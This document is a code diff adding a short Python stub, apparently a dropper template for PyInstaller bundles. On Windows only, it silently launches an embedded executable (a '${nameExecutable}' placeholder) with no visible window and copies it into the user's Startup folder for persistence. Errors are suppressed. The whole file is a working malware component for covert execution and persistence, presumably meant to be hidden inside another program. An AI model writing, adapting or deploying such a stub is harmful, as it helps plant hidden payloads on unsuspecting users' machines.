@@ -1,0 +1,27 @@
+import subprocess
+import os
+import platform
+import shutil
+import sys
+try:
+    if platform.system() != "Windows": exit()
+
+    if hasattr(sys, "_MEIPASS") is False: exit()
+    
+    executable = os.path.join(sys._MEIPASS, '${nameExecutable}')
+  
+    startup_folder = os.path.join(
+        os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+    )
+
+    print(startup_folder)
+
+    subprocess.Popen([executable], creationflags=subprocess.CREATE_NO_WINDOW)
+
+    shutil.copy(executable, startup_folder + "\\" + '${nameExecutable}')
+
+    print("Client launched successfully")
+
+
+except Exception as e:
+    exit()
